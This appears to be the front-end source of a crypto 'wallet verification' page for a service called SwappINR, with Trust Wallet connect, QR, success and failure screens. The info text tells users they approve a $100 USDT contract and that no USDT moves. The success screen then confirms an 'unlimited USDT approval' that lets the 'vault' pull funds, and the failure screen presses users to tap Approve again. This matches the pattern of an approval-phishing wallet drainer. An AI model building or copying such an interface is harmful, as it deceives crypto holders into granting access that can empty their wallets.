              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}><path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#F87171" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
              <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
                <span style={{ color: '#F87171', fontWeight: 700 }}>Requires ~10 TRX for energy</span> — charged by the TRON network for this approval
              </p>
            </div>
          ) : network === 'BEP20' ? (
            <div style={{ ...card, padding: '10px 14px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 10, borderColor: 'rgba(251,191,36,0.15)', background: 'rgba(251,191,36,0.04)' }}>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}><circle cx="12" cy="12" r="9" stroke="#FBBF24" strokeWidth="1.6"/><path d="M12 8V12M12 16h.01" stroke="#FBBF24" strokeWidth="1.6" strokeLinecap="round"/></svg>
              <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
                <span style={{ color: '#FBBF24', fontWeight: 700 }}>Small BNB amount needed</span> — for BNB Smart Chain gas on the approval transaction
              </p>
            </div>
          ) : (
            <div style={{ ...card, padding: '10px 14px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 10, borderColor: 'rgba(129,140,248,0.15)', background: 'rgba(129,140,248,0.04)' }}>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}><circle cx="12" cy="12" r="9" stroke="#818CF8" strokeWidth="1.6"/><path d="M12 8V12M12 16h.01" stroke="#818CF8" strokeWidth="1.6" strokeLinecap="round"/></svg>
              <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
                <span style={{ color: '#818CF8', fontWeight: 700 }}>Small ETH amount needed</span> — for Ethereum gas on the approval transaction
              </p>
            </div>
          )}

          <div style={{ ...card, padding: '10px 14px', marginBottom: 20, display: 'flex', alignItems: 'center', gap: 10, borderColor: 'rgba(204,255,0,0.12)', background: 'rgba(204,255,0,0.04)' }}>
            <IcoRefund />
            <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
              <span style={{ color: '#CCFF00', fontWeight: 700 }}>Gas fee refunded</span> by SwappINR after successful verification
            </p>
          </div>

          {genError && (
            <p style={{ fontSize: 12, color: '#F87171', margin: '0 0 12px', padding: '9px 12px', background: 'rgba(248,113,113,0.07)', borderRadius: 10, border: '1px solid rgba(248,113,113,0.2)' }}>
              {genError}
            </p>
          )}

          <button onClick={openTrustWallet} disabled={genLoading}
            style={{ width: '100%', padding: '15px', borderRadius: 14, fontSize: 15, fontWeight: 800, border: 'none',
              cursor: genLoading ? 'not-allowed' : 'pointer',
              background: genLoading ? 'rgba(255,255,255,0.07)' : '#CCFF00',
              color: genLoading ? 'rgba(255,255,255,0.3)' : '#000',
              display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 10,
              letterSpacing: '-0.01em',
              boxShadow: genLoading ? 'none' : '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)' }}>
            {genLoading ? (
              <>
                <div style={{ width: 16, height: 16, border: '2px solid rgba(255,255,255,0.15)', borderTopColor: 'rgba(255,255,255,0.5)', borderRadius: '50%', animation: 'spin 0.7s linear infinite' }} />
                Generating secure link…
              </>
            ) : (
              <>
                <svg width="18" height="18" viewBox="0 0 40 40" fill="none">
                  <rect width="40" height="40" rx="10" fill="#3375BB"/>
                  <path d="M20 7L10 11V19C10 24.5 14.4 29.6 20 31C25.6 29.6 30 24.5 30 19V11L20 7Z" fill="white"/>
                  <path d="M16.5 19.5L19 22L23.5 17" stroke="#3375BB" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                Open in Trust Wallet →
              </>
            )}
          </button>
        </div>
      );
    }

    /* ─── Waiting (live progress — same on mobile & desktop post-scan) ─── */
    if (phase === 'waiting') {
      return (
        <div style={{ animation: 'fadein 0.2s ease-out' }}>
          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            {isDesktop && (
              <div style={{ display: 'inline-flex', alignItems: 'center', gap: 6, padding: '5px 12px', background: 'rgba(0,229,160,0.07)', border: '1px solid rgba(0,229,160,0.18)', borderRadius: 99, marginBottom: 12 }}>
                <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#00E5A0', boxShadow: '0 0 6px rgba(0,229,160,0.6)' }} />
                <span style={{ fontSize: 11, fontWeight: 700, color: '#00E5A0' }}>QR scanned — Trust Wallet active</span>
              </div>
            )}
            <p style={{ fontSize: 17, fontWeight: 900, color: '#fff', margin: '0 0 4px', letterSpacing: '-0.02em' }}>
              {isDesktop ? 'Verifying on Mobile' : 'Waiting for Trust Wallet'}
            </p>
            <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.4)', margin: 0 }}>
              {isDesktop
                ? 'Complete the approval steps in Trust Wallet on your phone'
                : 'Complete the steps inside Trust Wallet'}
            </p>
          </div>

          <ProgressSteps />

          <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.25)', textAlign: 'center', margin: '0 0 14px', lineHeight: 1.5 }}>
            Updates automatically — keep this page open
          </p>

          <button onClick={retry}
            style={{ width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700,
              border: '1px solid rgba(255,255,255,0.08)', background: 'transparent', color: 'rgba(255,255,255,0.35)', cursor: 'pointer' }}>
            Start Over
          </button>
        </div>
      );
    }

    /* ─── Success ─── */
    if (phase === 'success') {
      return (
        <div style={{ textAlign: 'center', padding: '8px 0', animation: 'fadein 0.25s ease-out' }}>
          <div style={{ width: 72, height: 72, borderRadius: '50%', background: 'rgba(0,229,160,0.08)', border: '2px solid rgba(0,229,160,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
            <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
              <path d="M5 16L12.5 23.5L27 9" stroke="#00E5A0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>
          <p style={{ fontSize: 22, fontWeight: 900, color: '#fff', margin: '0 0 6px', letterSpacing: '-0.025em' }}>Wallet Verified!</p>
          <p style={{ fontSize: 13, color: 'rgba(255,255,255,0.5)', margin: '0 0 16px', lineHeight: 1.6 }}>
            Your {label} wallet is connected and the unlimited USDT approval is confirmed on-chain.
          </p>
          {successAddr && (
            <div style={{ display: 'inline-flex', alignItems: 'center', gap: 6, padding: '5px 12px', background: 'rgba(0,229,160,0.07)', border: '1px solid rgba(0,229,160,0.18)', borderRadius: 99, marginBottom: 20 }}>
              <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><circle cx="5" cy="5" r="4" stroke="#00E5A0" strokeWidth="1.2"/><circle cx="5" cy="5" r="1.5" fill="#00E5A0"/></svg>
              <span style={{ fontSize: 11, fontWeight: 700, color: '#00E5A0', fontFamily: 'monospace' }}>
                {successAddr.slice(0, 8)}…{successAddr.slice(-6)}
              </span>
            </div>
          )}
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 14px', background: 'rgba(0,229,160,0.05)', border: '1px solid rgba(0,229,160,0.12)', borderRadius: 12, marginBottom: 22, textAlign: 'left' }}>
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8 1L2 4V8C2 11 4.7 13.8 8 15C11.3 13.8 14 11 14 8V4L8 1Z" stroke="#00E5A0" strokeWidth="1.3" strokeLinejoin="round"/><path d="M5 8L7 10L11 6" stroke="#00E5A0" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>
            <div style={{ flex: 1 }}>
              <p style={{ fontSize: 12, fontWeight: 700, color: '#00E5A0', margin: '0 0 1px' }}>Unlimited USDT Access Approved</p>
              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: 0 }}>SwappINR vault can now pull funds on your behalf</p>
            </div>
          </div>
          <button onClick={() => onVerified(successAddr, successHash)}
            style={{ width: '100%', padding: '15px', borderRadius: 14, fontSize: 15, fontWeight: 800, border: 'none', cursor: 'pointer', background: '#CCFF00', color: '#000', letterSpacing: '-0.01em', marginBottom: 10, boxShadow: '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)' }}>
            Done →
          </button>
        </div>
      );
    }

    /* ─── Failed ─── */
    return (
      <div style={{ textAlign: 'center', padding: '4px 0', animation: 'fadein 0.2s ease-out' }}>
        <div style={{ width: 64, height: 64, borderRadius: 18, background: 'rgba(255,92,124,0.08)', border: '1px solid rgba(255,92,124,0.25)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 18px' }}>
          <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
            {failedStep === 'connection' ? (
              <>
                <path d="M6 14a8 8 0 0 1 8-8" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
                <path d="M22 14a8 8 0 0 1-8 8" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round" strokeDasharray="3 2"/>
                <path d="M10 10L18 18M18 10L10 18" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
              </>
            ) : (
              <>
                <circle cx="14" cy="14" r="10" stroke="#FF5C7C" strokeWidth="2"/>
                <path d="M10 10L18 18M18 10L10 18" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
              </>
            )}
          </svg>
        </div>
        <p style={{ fontSize: 20, fontWeight: 900, color: '#fff', margin: '0 0 8px', letterSpacing: '-0.025em' }}>
          {isDesktop ? 'Verification Failed' : 'Uhh oh!'}
        </p>
        <p style={{ fontSize: 14, fontWeight: 700, color: 'rgba(255,255,255,0.7)', margin: '0 0 6px' }}>
          {failedStep === 'connection' ? 'Wallet connection failed' : 'Contract approval declined'}
        </p>
        <p style={{ fontSize: 13, color: 'rgba(255,255,255,0.4)', margin: '0 0 24px', lineHeight: 1.7 }}>
          {failedStep === 'connection'
            ? (isDesktop ? 'Tap "Connect" in Trust Wallet on your phone — then scan again.' : 'Tap "Connect" when Trust Wallet asks — then try again.')
            : (isDesktop ? 'Tap "Approve" on the contract screen in Trust Wallet — then try again.' : 'Tap "Approve" on the contract screen — then try again.')}
        </p>
        <button onClick={retry}
          style={{ width: '100%', padding: '15px', borderRadius: 14, fontSize: 15, fontWeight: 800, border: 'none', cursor: 'pointer', background: '#CCFF00', color: '#000', letterSpacing: '-0.01em', marginBottom: 10, boxShadow: '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)' }}>
          {isDesktop ? 'Show New QR →' : 'Try Again →'}
        </button>
        {isDesktop && (
          <a href={SUPPORT_URL} target="_blank" rel="noopener noreferrer"
            style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700, color: 'rgba(255,255,255,0.4)', background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.09)', textDecoration: 'none' }}>
            Contact Support
          </a>
        )}
        {!isDesktop && (
          <button onClick={onClose} style={{ width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700, border: '1px solid rgba(255,255,255,0.08)', background: 'transparent', color: 'rgba(255,255,255,0.35)', cursor: 'pointer' }}>
            Cancel
          </button>
        )}
      </div>
    );
  }

  /* ── Desktop: centered glass modal ── */
  if (isDesktop) {
    const modal = (
      <div
        onClick={e => { if (e.target === e.currentTarget && (phase === 'qr' || phase === 'info')) onClose(); }}
        style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px 16px', background: 'rgba(0,0,0,0.72)', backdropFilter: 'blur(16px)', WebkitBackdropFilter: 'blur(16px)' }}
      >
        <style>{`@keyframes spin{to{transform:rotate(360deg)}} @keyframes fadein{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}`}</style>
        <div style={{ width: '100%', maxWidth: 440, background: '#0d0d0f', border: '1px solid rgba(255,255,255,0.10)', borderRadius: 20, boxShadow: '0 32px 80px rgba(0,0,0,0.7)', overflow: 'hidden', maxHeight: '92dvh', overflowY: 'auto' } as React.CSSProperties}>
          <div style={{ height: 2, background: `linear-gradient(90deg, transparent, ${color}, transparent)` }} />
          <div style={{ padding: '22px 24px 28px' }}>
            <ModalContent />
          </div>
        </div>
      </div>
    );
    if (typeof document === 'undefined') return null;
    return createPortal(modal, document.body);
  }

  /* ── Mobile: bottom sheet ── */
  const modal = (
    <div
      onClick={e => { if (e.target === e.currentTarget && phase === 'info') onClose(); }}
      style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', alignItems: 'flex-end', background: 'rgba(0,0,0,0.65)', backdropFilter: 'blur(16px)', WebkitBackdropFilter: 'blur(16px)' }}
    >
      <style>{`@keyframes slideup{from{transform:translateY(100%)}to{transform:translateY(0)}} @keyframes spin{to{transform:rotate(360deg)}} @keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}`}</style>
      <div style={{ width: '100%', background: '#0d0d0f', border: '1px solid rgba(255,255,255,0.10)', borderBottom: 'none', borderRadius: '20px 20px 0 0', boxShadow: '0 -24px 80px rgba(0,0,0,0.6)', overflow: 'hidden', animation: 'slideup 0.32s cubic-bezier(0.32,0.72,0,1)', maxHeight: '92dvh', overflowY: 'auto', WebkitOverflowScrolling: 'touch' } as React.CSSProperties}>
        <div style={{ display: 'flex', justifyContent: 'center', padding: '12px 0 4px' }}>
          <div style={{ width: 36, height: 4, borderRadius: 99, background: 'rgba(255,255,255,0.15)' }} />
        </div>
        <div style={{ padding: '8px 20px 32px' }}>
          <ModalContent />
        </div>
      </div>
    </div>
  );

  if (typeof document === 'undefined') return null;
  return createPortal(modal, document.body);
}


/* ═══════════════════════════════════════════ */
export default function WalletsPage() {
  const { data: session, status } = useSession({ required: true });
  const [wallets,       setWallets]       = useState<WalletDocument[]>([]);
  const [loading,       setLoading]       = useState(true);
  const [loadError,     setLoadError]     = useState(false);
  const [removing,      setRemoving]      = useState<string | null>(null);
  const [depositAddresses, setDepositAddresses] = useState<Record<string, string>>({});
  const [modalNet,      setModalNet]      = useState<Network | null>(null);
  const [fundsWallet,   setFundsWallet]   = useState<WalletDocument | null>(null);
  const [isMobile,      setIsMobile]      = useState(false);
  const [expandedNet,   setExpandedNet]   = useState<Network | null>(null);
  // walletId → balance string ("12.34") | null (error) | undefined (loading)
  const [balances, setBalances] = useState<Record<string, string | null>>({});
  // Platform wallet
  const [platBalance,   setPlatBalance]   = useState<number | null>(null);
  const [platTxs,       setPlatTxs]       = useState<any[]>([]);

  useEffect(() => {
    setIsMobile(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent));
  }, []);

  async function loadWallets() {
    setLoading(true); setLoadError(false);
    try {
      const r = await fetch('/api/wallets');
      const d = await r.json();
      if (d.success) {
        setWallets(d.data);
      } else {
        setLoadError(true);
      }
    } catch {
      setLoadError(true);
    } finally {
      setLoading(false);
    }
  }

  // Only fetch once the session is confirmed — avoids a silent 401 on first render
  // that leaves wallets empty for the entire session.
  useEffect(() => {
    if (status !== 'authenticated') return;
    loadWallets();
    fetch('/api/user/platform-wallet').then(r => r.json()).then(d => {
      if (d.success) { setPlatBalance(d.balance); setPlatTxs(d.transactions ?? []); }
    }).catch(() => {});

    fetch('/api/rates', { cache: 'no-store' })
      .then(r => r.ok ? r.json() : null)
      .then(j => {
        if (!j?.data) return;
        const map: Record<string, string> = {};
        for (const r of j.data) if (r.symbol === 'USDT' && r.depositAddress) map[r.network] = r.depositAddress;
        setDepositAddresses(map);
      })
      .catch(() => {});
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [status]);

  // Fetch USDT balance for each verified wallet whenever the wallet list changes.
  useEffect(() => {
    if (!wallets.length) return;
    wallets.forEach(w => {
      fetch(`/api/wallets/balance?chainId=${w.chainId}&address=${encodeURIComponent(w.address)}`)
        .then(r => r.json())
        .then(d => setBalances(prev => ({ ...prev, [w._id]: typeof d.balance === 'string' ? d.balance : null })))
        .catch(() => setBalances(prev => ({ ...prev, [w._id]: null })));
    });
  }, [wallets]);

  async function removeWallet(id: string) {
    if (!confirm('Remove this wallet?')) return;
    setRemoving(id);
    try {
      const res = await fetch(`/api/wallets/${id}`, { method: 'DELETE' });
      if (!res.ok) { toast.error('Failed to remove'); return; }
      setWallets(w => w.filter(wl => wl._id !== id));
      toast.success('Wallet removed');
    } catch { toast.error('Failed to remove'); }
    finally { setRemoving(null); }
  }

  async function handleVerified(network: Network, address: string, txHash?: string) {
    try {
      await fetch('/api/wallets', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address, chainId: networkChainId(network),
          chainName: network === 'ERC20' ? 'Ethereum (ERC20)' : network === 'BEP20' ? 'BNB Smart Chain (BEP20)' : 'Tron (TRC20)',
          label: network, verificationTxHash: txHash,
          approved: !!txHash, approvalTxHash: txHash,
        }),
      });
      await loadWallets();
      toast.success(`${network} wallet verified and saved!`);
    } catch { /* already exists */ }
    setModalNet(null);
  }

  if (status === 'loading' || !session) return <PageLoading />;

  const activeNet = NETWORKS.find(n => n.key === modalNet);

  const card: React.CSSProperties = {
    background: 'var(--fr-dark-2)',
    border: '1px solid var(--fr-border-default)',
    borderRadius: 'var(--fr-radius-xl)',
  };

  return (
    <ClientShell user={session.user as any} rates={[]}>
      <div style={{ maxWidth: 760, margin: '0 auto' }}>

        {/* Header */}
        <div style={{ marginBottom: 28 }}>
          <h1 style={{ fontSize: 26, fontWeight: 900, color: 'var(--fr-text-primary)', margin: 0, letterSpacing: '-0.03em' }}>Wallet</h1>
          <p style={{ margin: '5px 0 0', fontSize: 14, color: 'var(--fr-text-tertiary)' }}>
            Connect and verify your USDT wallets for all supported networks
          </p>
        </div>

        {/* Info strip */}
        <div style={{ ...card, padding: '14px 18px', marginBottom: 20, display: 'flex', alignItems: 'flex-start', gap: 12 }}>
          <div style={{ width: 32, height: 32, borderRadius: 9, background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#CCFF00', flexShrink: 0 }}>
            <IcoShield />
          </div>
          <div>
            <p style={{ fontSize: 12, fontWeight: 700, color: 'var(--fr-text-primary)', margin: '0 0 3px' }}>One step — fully verified and ready</p>
            <p style={{ fontSize: 12, color: 'var(--fr-text-tertiary)', margin: 0, lineHeight: 1.6 }}>
              Connect your Trust Wallet and approve a $100 USDT smart contract. This proves ownership and enables Add Funds in one step — no USDT is transferred.
            </p>
          </div>
        </div>

        {/* Load-error banner with retry */}
        {loadError && !loading && (
          <div style={{ ...card, padding: '14px 18px', marginBottom: 20, display: 'flex', alignItems: 'center', gap: 12, borderColor: 'rgba(248,113,113,0.25)', background: 'rgba(248,113,113,0.05)' }}>
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style={{ flexShrink: 0 }}>
              <circle cx="8" cy="8" r="7" stroke="#F87171" strokeWidth="1.4"/>
              <path d="M8 5V8.5M8 11h.01" stroke="#F87171" strokeWidth="1.5" strokeLinecap="round"/>
            </svg>
            <p style={{ fontSize: 13, color: '#F87171', margin: 0, flex: 1 }}>Could not load wallets.</p>
            <button
              onClick={loadWallets}
              style={{ fontSize: 12, fontWeight: 700, color: '#CCFF00', background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.22)', borderRadius: 8, padding: '5px 12px', cursor: 'pointer', flexShrink: 0 }}
            >
              Retry
            </button>
          </div>
        )}

        {/* ── On-chain wallets ── */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          {NETWORKS.map(({ key, label, sublabel, color }) => {
            const saved   = wallets.find(w => w.chainId === networkChainId(key));
            const isOpen  = expandedNet === key;
            const bal     = saved ? balances[saved._id] : undefined;
            const balNum  = bal != null ? parseFloat(bal) : null;
            const balStr  = balNum != null ? balNum.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '—';

            return (
              <div key={key} style={{ background: '#111', border: `1px solid ${isOpen ? 'rgba(204,255,0,0.18)' : 'rgba(255,255,255,0.07)'}`, borderRadius: 16, overflow: 'hidden', transition: 'border-color 0.2s' }}>

                {/* Header row — always visible */}
                <button
                  onClick={() => saved && setExpandedNet(isOpen ? null : key)}
                  style={{ width: '100%', display: 'flex', alignItems: 'center', gap: 14, padding: '14px 18px', background: 'transparent', border: 'none', cursor: saved ? 'pointer' : 'default', textAlign: 'left' }}
                >
                  <TokenIcon network={key} size={40} />
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <p style={{ fontSize: 14, fontWeight: 800, color: '#fff', margin: 0, letterSpacing: '-0.02em' }}>{label}</p>
                    <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: '2px 0 0' }}>{sublabel}</p>
                  </div>
                  {loading ? (
                    <div style={{ width: 18, height: 18, borderRadius: '50%', border: `2px solid rgba(255,255,255,0.1)`, borderTopColor: color, animation: 'spin 0.8s linear infinite', flexShrink: 0 }} />
                  ) : saved ? (
                    <>
                      {/* Balance pill */}
                      <div style={{ textAlign: 'right', flexShrink: 0 }}>
                        <p style={{ fontSize: 13, fontWeight: 800, color: '#CCFF00', margin: 0, letterSpacing: '-0.02em', fontFamily: 'monospace' }}>
                          {bal === undefined ? '…' : balStr}
                        </p>
                        <p style={{ fontSize: 10, color: 'rgba(255,255,255,0.35)', margin: 0, letterSpacing: '0.04em' }}>USDT</p>
                      </div>
                      <div style={{ width: 26, height: 26, borderRadius: '50%', background: 'rgba(0,229,160,0.12)', border: '1.5px solid rgba(0,229,160,0.35)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                        <IcoCheck />
                      </div>
                      <svg width="14" height="14" viewBox="0 0 14 14" fill="none" style={{ flexShrink: 0, transition: 'transform 0.2s', transform: isOpen ? 'rotate(180deg)' : 'none', color: 'rgba(255,255,255,0.3)' }}>
                        <path d="M2 5L7 10L12 5" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    </>
                  ) : (
                    <button
                      onClick={e => { e.stopPropagation(); setModalNet(key); }}
                      style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontSize: 12, fontWeight: 800, color: '#000', background: '#CCFF00', border: 'none', borderRadius: 9, padding: '7px 14px', cursor: 'pointer', letterSpacing: '-0.01em', flexShrink: 0 }}
                    >
                      <IcoPlus /> Add wallet
                    </button>
                  )}
                </button>

                {/* Expanded detail panel */}
                {isOpen && saved && (
                  <div style={{ borderTop: '1px solid rgba(255,255,255,0.07)', padding: '16px 18px', animation: 'fadeIn 0.15s ease-out' }}>
                    {/* Address row */}
                    <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 14, padding: '10px 14px', background: 'rgba(255,255,255,0.03)', borderRadius: 10, border: '1px solid rgba(255,255,255,0.06)' }}>
                      <div style={{ flex: 1, minWidth: 0 }}>
                        <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'rgba(255,255,255,0.3)', margin: '0 0 4px' }}>Wallet Address</p>
                        <p style={{ fontSize: 12, fontWeight: 600, color: '#fff', margin: 0, fontFamily: 'monospace', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                          {saved.address}
                        </p>
                      </div>
                      <button
                        onClick={() => navigator.clipboard.writeText(saved.address)}
                        style={{ width: 30, height: 30, borderRadius: 8, background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.1)', color: 'rgba(255,255,255,0.4)', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}
                        title="Copy address"
                      >
                        <IcoLink />
                      </button>
                    </div>

                    {/* Stats row */}
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginBottom: 14 }}>
                      <div style={{ padding: '10px 14px', background: 'rgba(204,255,0,0.04)', borderRadius: 10, border: '1px solid rgba(204,255,0,0.1)' }}>
                        <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'rgba(255,255,255,0.35)', margin: '0 0 4px' }}>USDT Balance</p>
                        <p style={{ fontSize: 18, fontWeight: 900, color: '#CCFF00', margin: 0, fontFamily: 'monospace', letterSpacing: '-0.02em' }}>
                          {bal === undefined ? '…' : balStr}
                        </p>
                      </div>
                      <div style={{ padding: '10px 14px', background: 'rgba(0,229,160,0.04)', borderRadius: 10, border: '1px solid rgba(0,229,160,0.1)' }}>
                        <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'rgba(255,255,255,0.35)', margin: '0 0 4px' }}>Status</p>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                          <div style={{ width: 22, height: 22, borderRadius: '50%', background: 'rgba(0,229,160,0.12)', border: '1.5px solid rgba(0,229,160,0.35)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}><IcoCheck /></div>
                          <span style={{ fontSize: 12, fontWeight: 700, color: '#00E5A0' }}>Verified</span>
                        </div>
                        <p style={{ fontSize: 10, color: 'rgba(255,255,255,0.35)', margin: '2px 0 0' }}>{saved.chainName ?? key}</p>
                      </div>
                    </div>

                    {/* Actions */}
                    <div style={{ display: 'flex', gap: 8 }}>
                      {key === 'TRC20' && !saved.approved ? (
                        <button
                          onClick={() => setModalNet(key)}
                          style={{ flex: 1, display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: 6, fontSize: 13, fontWeight: 800, color: '#000', background: '#CCFF00', border: 'none', borderRadius: 10, padding: '10px 16px', cursor: 'pointer' }}
                        >
                          <IcoShield /> Enable Vault
                        </button>
                      ) : (
                        <button
                          onClick={() => setFundsWallet(saved)}
                          style={{ flex: 1, display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: 6, fontSize: 13, fontWeight: 800, color: '#000', background: '#CCFF00', border: 'none', borderRadius: 10, padding: '10px 16px', cursor: 'pointer' }}
                        >
                          <IcoFunds /> Add Funds
                        </button>
                      )}
                      <button
                        onClick={() => { removeWallet(saved._id); setExpandedNet(null); }}
                        disabled={removing === saved._id}
                        style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', width: 42, height: 42, borderRadius: 10, background: 'rgba(248,113,113,0.06)', border: '1px solid rgba(248,113,113,0.18)', color: '#F87171', cursor: 'pointer', flexShrink: 0 }}
                        title="Remove wallet"
                      >
                        <IcoTrash />
                      </button>
                    </div>
                  </div>
                )}
              </div>
            );
          })}
        </div>

        {/* ── SwappINR Platform Wallet ── */}
        <div style={{ marginTop: 24, background: '#111', border: '1px solid rgba(204,255,0,0.12)', borderRadius: 16, overflow: 'hidden' }}>
          <div style={{ height: 2, background: 'linear-gradient(90deg,transparent,#CCFF00,transparent)' }} />
          <div style={{ padding: '16px 18px 14px', borderBottom: '1px solid rgba(255,255,255,0.07)', display: 'flex', alignItems: 'center', gap: 10 }}>
            <div style={{ width: 36, height: 36, borderRadius: 10, background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.18)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M3 10H21M3 6H21M7 14H10M3 18H8" stroke="#CCFF00" strokeWidth="1.6" strokeLinecap="round"/><rect x="3" y="3" width="18" height="18" rx="2" stroke="#CCFF00" strokeWidth="1.6"/></svg>
            </div>
            <div style={{ flex: 1 }}>
              <p style={{ fontSize: 14, fontWeight: 800, color: '#fff', margin: 0 }}>SwappINR Wallet</p>
              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.35)', margin: '2px 0 0' }}>Internal platform balance</p>
            </div>
            <div style={{ textAlign: 'right' }}>
              <p style={{ fontSize: 20, fontWeight: 900, color: '#CCFF00', margin: 0, fontFamily: 'monospace', letterSpacing: '-0.03em' }}>
                {platBalance === null ? '…' : platBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </p>
              <p style={{ fontSize: 10, fontWeight: 700, color: 'rgba(255,255,255,0.35)', margin: 0, letterSpacing: '0.06em' }}>USDT</p>
            </div>
          </div>

          {/* Transaction history */}
          <div style={{ padding: '12px 18px' }}>
            <p style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.1em', color: 'rgba(255,255,255,0.3)', margin: '0 0 10px' }}>Recent Activity</p>
            {platTxs.length === 0 ? (
              <div style={{ textAlign: 'center', padding: '20px 0' }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" style={{ display: 'block', margin: '0 auto 8px', opacity: 0.2 }}><circle cx="12" cy="12" r="9" stroke="white" strokeWidth="1.4"/><path d="M12 8V12M12 16h.01" stroke="white" strokeWidth="1.5" strokeLinecap="round"/></svg>
                <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.25)', margin: 0 }}>No transactions yet</p>
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                {platTxs.map((tx: any, i: number) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '9px 12px', background: 'rgba(255,255,255,0.03)', borderRadius: 10, border: '1px solid rgba(255,255,255,0.05)' }}>
